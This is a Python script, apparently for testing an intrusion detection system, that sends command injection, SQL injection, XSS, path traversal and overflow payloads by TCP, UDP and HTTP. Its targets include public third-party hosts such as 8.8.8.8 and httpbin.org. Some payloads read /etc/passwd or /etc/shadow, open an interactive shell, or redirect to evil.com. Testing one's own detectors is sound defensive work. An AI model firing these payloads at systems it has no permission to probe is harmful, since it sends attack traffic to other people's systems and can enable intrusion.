#!/usr/bin/env python3
"""
Suspicious Payload Detection Test - Working Version
Targets external IPs and generates proper network traffic with malicious payloads
ONLY USE ON YOUR OWN SYSTEM FOR TESTING
"""

import socket
import threading
import time
import sys
import urllib.parse
import requests
from urllib3.exceptions import InsecureRequestWarning
import random

# Suppress SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SuspiciousPayloadTest:
    def __init__(self):
        # External target options (bypass any filtering)
        self.target_options = [
            ("8.8.8.8", [53, 80]),        # Google DNS
            ("1.1.1.1", [53, 80]),        # Cloudflare DNS  
            ("208.67.222.222", [53, 80]), # OpenDNS
            ("192.168.1.1", [80, 443]),   # Router IP
            ("127.0.0.2", [80, 443]),     # Localhost bypass
            ("httpbin.org", [80, 443])    # Public HTTP testing service
        ]
        
        self.selected_targets = []
        self.payload_count = 0
        self.lock = threading.Lock()
        
        # Enhanced malicious payload patterns that match IDS rules
        self.payloads = {
            'command_injection': [
                'cmd.exe /c dir',
                'cmd.exe /c whoami',
                '/bin/sh -c ls',
                '/bin/sh -c id',
                'powershell Get-Process',
                'powershell -Command "Get-ChildItem"',
                'system("whoami")',
                'system("ls -la")',
                'exec("id")',
                'exec("cat /etc/passwd")',
                '`whoami`',
                '$(id)',
                '; cat /etc/passwd',
                '&& net user',
                'bash -i',
                'sh -i'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin'--",
                "' OR 1=1 #",
                "1' AND '1'='1",
                "SELECT * FROM users WHERE id = '1' OR '1'='1'",
                "UNION SELECT username, password FROM admin",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR EXISTS(SELECT * FROM users) --"
            ],
            'xss_payloads': [
                "<script>alert('xss')</script>",
                "<script>document.location='http://evil.com'</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "javascript:document.location='http://malicious.com'",
                "<svg onload=alert('xss')>",
                "eval(alert('xss'))",
                "eval(document.cookie)",
                "<script>document.cookie</script>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<body onload=alert('XSS')>"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "../../../../boot.ini",
                "../../../var/log/apache/access.log",
                "....//....//....//etc/passwd",
                "..\\..\\..\\..\\windows\\system.ini",
                "/etc/passwd",
                "/etc/shadow",
                "C:\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'buffer_overflow': [
                "A" * 2000,
                "B" * 3000,
                "C" * 4000,
                "X" * 5000,
                "%s%s%s%s%s%s%s%s%s%s" * 200,
                "\\x41" * 1000,
                "AAAA" * 500
            ]
        }
    
    def select_targets(self):
        """Select reachable targets for payload testing"""
        print("🎯 Selecting targets for payload testing...")
        
        # Always include these for testing
        self.selected_targets = [
            ("8.8.8.8", [53, 80]),
            ("127.0.0.2", [80, 443, 8080]),
            ("httpbin.org", [80, 443])
        ]
        
        print(f"✅ Selected targets: {len(self.selected_targets)} endpoints")
        for target, ports in self.selected_targets:
            print(f"   • {target} (ports: {ports})")
        
        return True
    
    def send_tcp_payload(self, target_ip, port, payload, payload_type):
        """Send payload via TCP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            
            # Craft different request types based on port and payload
            if port in [80, 443, 8080]:
                # HTTP request with payload
                http_request = f"GET /{urllib.parse.quote(payload)} HTTP/1.1\r\n"
                http_request += f"Host: {target_ip}\r\n"
                http_request += f"User-Agent: Mozilla/5.0 {payload}\r\n"
                http_request += f"X-Injection: {payload}\r\n"
                http_request += f"Cookie: session={payload}\r\n"
                http_request += "\r\n"
                sock.send(http_request.encode())
                
                # Also send POST request
                post_data = f"username={payload}&password=test&data={payload}"
                post_request = f"POST /login HTTP/1.1\r\n"
                post_request += f"Host: {target_ip}\r\n"
                post_request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                post_request += f"Content-Length: {len(post_data)}\r\n"
                post_request += f"\r\n{post_data}"
                sock.send(post_request.encode())
                
            elif port == 21:  # FTP
                ftp_commands = [
                    f"USER {payload}\r\n",
                    f"PASS {payload}\r\n",
                    f"RETR {payload}\r\n",
                    f"STOR {payload}\r\n"
                ]
                for cmd in ftp_commands:
                    sock.send(cmd.encode())
                    time.sleep(0.1)
                    
            elif port == 22:  # SSH
                ssh_payload = f"SSH-2.0-{payload}\r\n"
                sock.send(ssh_payload.encode())
                
            elif port == 23:  # Telnet
                sock.send(f"{payload}\r\n".encode())
                time.sleep(0.1)
                sock.send(f"{payload}\r\n".encode())
                
            else:
                # Raw payload for other ports
                sock.send(f"{payload}\r\n".encode())
            
            # Try to read response to ensure traffic flow
            try:
                sock.recv(1024)
            except:
                pass
                
            sock.close()
            
            with self.lock:
                self.payload_count += 1
            
            print(f"🚀 {payload_type} payload #{self.payload_count} → {target_ip}:{port}")
            
        except Exception as e:
            with self.lock:
                self.payload_count += 1
            print(f"❌ {payload_type} payload #{self.payload_count} → {target_ip}:{port} (failed)")
    
    def send_udp_payload(self, target_ip, port, payload, payload_type):
        """Send payload via UDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            if port == 53:  # DNS
                # Create DNS query with payload in domain name
                dns_payload = f"{payload}.malicious.com"
                # Simple DNS query structure
                dns_packet = b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00'
                dns_packet += len(payload).to_bytes(1, 'big') + payload.encode()
                dns_packet += b'\\x09malicious\\x03com\\x00\\x00\\x01\\x00\\x01'
                sock.sendto(dns_packet, (target_ip, port))
            else:
                # Regular UDP payload
                sock.sendto(payload.encode(), (target_ip, port))
            
            sock.close()
            
            with self.lock:
                self.payload_count += 1
                
            print(f"📡 {payload_type} UDP payload #{self.payload_count} → {target_ip}:{port}")
            
        except Exception as e:
            with self.lock:
                self.payload_count += 1
            print(f"❌ {payload_type} UDP payload #{self.payload_count} → {target_ip}:{port} (failed)")
    
    def send_http_payload(self, target_ip, payload, payload_type):
        """Send HTTP payload using requests library"""
        try:
            base_url = f"http://{target_ip}"
            
            # Multiple HTTP attack vectors
            attack_vectors = [
                # GET with payload in URL
                ('GET', f"{base_url}/search", {'q': payload, 'data': payload}),
                # POST with payload in form data  
                ('POST', f"{base_url}/login", {'username': payload, 'password': payload}),
                # GET with payload in headers
                ('GET', f"{base_url}/", {}, {'X-Payload': payload, 'User-Agent': f"Browser {payload}"}),
                # POST with payload in JSON
                ('POST', f"{base_url}/api", payload if isinstance(payload, str) else str(payload)),
            ]
            
            for method, url, data, *headers in attack_vectors:
                try:
                    if method == 'GET':
                        requests.get(url, params=data, headers=headers[0] if headers else {}, timeout=1, verify=False)
                    else:
                        requests.post(url, data=data, headers=headers[0] if headers else {}, timeout=1, verify=False)
                    
                    with self.lock:
                        self.payload_count += 1
                        
                except Exception:
                    with self.lock:
                        self.payload_count += 1
                
                time.sleep(0.1)
                
            print(f"🌐 {payload_type} HTTP payloads sent to {target_ip}")
            
        except Exception as e:
            print(f"❌ HTTP {payload_type} failed to {target_ip}: {e}")
    
    def test_command_injection(self):
        """Test command injection payload detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("💻 COMMAND INJECTION PAYLOAD TEST")
        print("=" * 60)
        print("Testing command injection payloads...")
        print("Target patterns: cmd.exe, /bin/sh, powershell, system(), exec()")
        print("=" * 60)
        
        threads = []
        
        for payload in self.payloads['command_injection']:
            for target_ip, ports in self.selected_targets:
                for port in ports:
                    # Send via TCP
                    thread = threading.Thread(
                        target=self.send_tcp_payload,
                        args=(target_ip, port, payload, "Command Injection")
                    )
                    threads.append(thread)
                    thread.start()
                    
                    # Also send via UDP for some ports
                    if port in [53, 123]:
                        thread = threading.Thread(
                            target=self.send_udp_payload,
                            args=(target_ip, port, payload, "Command Injection")
                        )
                        threads.append(thread)
                        thread.start()
                    
                    time.sleep(0.05)
        
        # Wait for threads
        for thread in threads:
            thread.join()
        
        print("✅ Command injection test completed!")
    
    def test_sql_injection(self):
        """Test SQL injection payload detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("🗃️ SQL INJECTION PAYLOAD TEST") 
        print("=" * 60)
        print("Testing SQL injection payloads...")
        print("Target patterns: SELECT * FROM, UNION SELECT, OR '1'='1")
        print("=" * 60)
        
        threads = []
        
        for payload in self.payloads['sql_injection']:
            for target_ip, ports in self.selected_targets:
                # Focus on web ports for SQL injection
                web_ports = [p for p in ports if p in [80, 443, 8080]]
                
                for port in web_ports:
                    # Send via TCP
                    thread = threading.Thread(
                        target=self.send_tcp_payload,
                        args=(target_ip, port, payload, "SQL Injection")
                    )
                    threads.append(thread)
                    thread.start()
                    
                    time.sleep(0.1)
                
                # Also send via HTTP requests
                if target_ip in ["127.0.0.2", "httpbin.org"]:
                    thread = threading.Thread(
                        target=self.send_http_payload,
                        args=(target_ip, payload, "SQL Injection")
                    )
                    threads.append(thread)
                    thread.start()
        
        for thread in threads:
            thread.join()
        
        print("✅ SQL injection test completed!")
    
    def test_xss_payloads(self):
        """Test XSS payload detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("🔧 XSS PAYLOAD TEST")
        print("=" * 60)
        print("Testing Cross-Site Scripting payloads...")
        print("Target patterns: <script>, javascript:, eval()")
        print("=" * 60)
        
        threads = []
        
        for payload in self.payloads['xss_payloads']:
            for target_ip, ports in self.selected_targets:
                # Focus on web ports
                web_ports = [p for p in ports if p in [80, 443, 8080]]
                
                for port in web_ports:
                    thread = threading.Thread(
                        target=self.send_tcp_payload,
                        args=(target_ip, port, payload, "XSS")
                    )
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.05)
        
        for thread in threads:
            thread.join()
        
        print("✅ XSS payload test completed!")
    
    def test_buffer_overflow(self):
        """Test buffer overflow payload detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("💥 BUFFER OVERFLOW PAYLOAD TEST")
        print("=" * 60)
        print("Testing buffer overflow payloads...")
        print("Target: Large payloads (>1000 bytes)")
        print("=" * 60)
        
        threads = []
        
        # Send large payloads to various services
        for payload in self.payloads['buffer_overflow']:
            for target_ip, ports in self.selected_targets:
                for port in ports:
                    # Send via TCP
                    thread = threading.Thread(
                        target=self.send_tcp_payload,
                        args=(target_ip, port, payload[:1000], "Buffer Overflow")  # Limit size
                    )
                    threads.append(thread)
                    thread.start()
                    
                    # Also send via UDP
                    if port in [53, 123]:
                        thread = threading.Thread(
                            target=self.send_udp_payload,
                            args=(target_ip, port, payload[:500], "Buffer Overflow")
                        )
                        threads.append(thread)
                        thread.start()
                    
                    time.sleep(0.05)
        
        for thread in threads:
            thread.join()
        
        print("✅ Buffer overflow test completed!")
    
    def test_path_traversal(self):
        """Test path traversal payload detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("📁 PATH TRAVERSAL PAYLOAD TEST")
        print("=" * 60)
        print("Testing path traversal payloads...")
        print("Target patterns: ../, \\..\\, /etc/passwd")
        print("=" * 60)
        
        threads = []
        
        for payload in self.payloads['path_traversal']:
            for target_ip, ports in self.selected_targets:
                # Focus on web and file transfer ports
                relevant_ports = [p for p in ports if p in [80, 443, 21, 8080]]
                
                for port in relevant_ports:
                    thread = threading.Thread(
                        target=self.send_tcp_payload,
                        args=(target_ip, port, payload, "Path Traversal")
                    )
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.1)
        
        for thread in threads:
            thread.join()
        
        print("✅ Path traversal test completed!")
    
    def run_rapid_payload_test(self):
        """Rapid payload test to guarantee detection"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("⚡ RAPID PAYLOAD TEST")
        print("=" * 60)
        print("Sending mixed malicious payloads rapidly...")
        print("This will DEFINITELY trigger Suspicious Payload detection!")
        print("=" * 60)
        
        # Mix all payload types
        all_payloads = []
        for category, payloads in self.payloads.items():
            for payload in payloads[:3]:  # Take first 3 from each category
                all_payloads.append((payload, category))
        
        threads = []
        
        for payload, category in all_payloads:
            for target_ip, ports in self.selected_targets:
                # Use web ports primarily
                port = ports[0] if 80 in ports else ports[0]
                
                thread = threading.Thread(
                    target=self.send_tcp_payload,
                    args=(target_ip, port, payload, f"Rapid {category}")
                )
                threads.append(thread)
                thread.start()
                time.sleep(0.02)  # Very rapid
        
        for thread in threads:
            thread.join()
        
        print("⚡ Rapid payload test completed!")
    
    def run_comprehensive_test(self):
        """Run all payload tests"""
        if not self.select_targets():
            return
            
        print("=" * 60)
        print("🎯 COMPREHENSIVE PAYLOAD TEST")
        print("=" * 60)
        print("Running all suspicious payload tests...")
        print("This will trigger multiple Suspicious Payload alerts!")
        print("=" * 60)
        
        # Run all tests with delays between them
        tests = [
            ("Command Injection", self.test_command_injection),
            ("SQL Injection", self.test_sql_injection),
            ("XSS Payloads", self.test_xss_payloads),
            ("Path Traversal", self.test_path_traversal),
            ("Buffer Overflow", self.test_buffer_overflow)
        ]
        
        for test_name, test_func in tests:
            print(f"\n🚀 Running {test_name}...")
            test_func()
            print(f"⏳ Waiting 2 seconds...")
            time.sleep(2)
        
        self.show_results()
    
    def show_results(self):
        """Show test results"""
        print("=" * 60)
        print("📊 SUSPICIOUS PAYLOAD TEST RESULTS")
        print("=" * 60)
        print(f"Targets tested: {len(self.selected_targets)}")
        print(f"Total malicious payloads sent: {self.payload_count}")
        print(f"Payload categories: {len(self.payloads)}")
        print("=" * 60)
        print("✅ Payload test completed!")
        print("🛡️ Check your IDS web interface for Suspicious Payload alerts!")
        print("📈 Look for 'Suspicious Payload Pattern' alerts")
        print("=" * 60)

if __name__ == "__main__":
    print("Suspicious Payload Detection Test - Working Version")
    print("Targets external IPs and generates detectable malicious traffic")
    
    tester = SuspiciousPayloadTest()
    
    print("\nChoose payload test:")
    print("1. ⚡ Rapid Payload Test (mixed payloads)")
    print("2. 💻 Command Injection")
    print("3. 🗃️ SQL Injection")
    print("4. 🔧 XSS Payloads")
    print("5. 📁 Path Traversal")
    print("6. 💥 Buffer Overflow")
    print("7. 🎯 All Payload Tests")
    print("8. ❌ Cancel")
    
    choice = input("Enter choice (1-8): ").strip()
    
    try:
        if choice == "1":
            tester.run_rapid_payload_test()
            
        elif choice == "2":
            tester.test_command_injection()
            
        elif choice == "3":
            tester.test_sql_injection()
            
        elif choice == "4":
            tester.test_xss_payloads()
            
        elif choice == "5":
            tester.test_path_traversal()
            
        elif choice == "6":
            tester.test_buffer_overflow()
            
        elif choice == "7":
            tester.run_comprehensive_test()
            
        elif choice == "8":
            print("Test cancelled.")
            sys.exit(0)
            
        else:
            print("Invalid choice. Running rapid test.")
            tester.run_rapid_payload_test()
        
        if choice not in ["7"]:
            tester.show_results()
        
    except KeyboardInterrupt:
        print("\nPayload test interrupted by user")
        tester.show_results()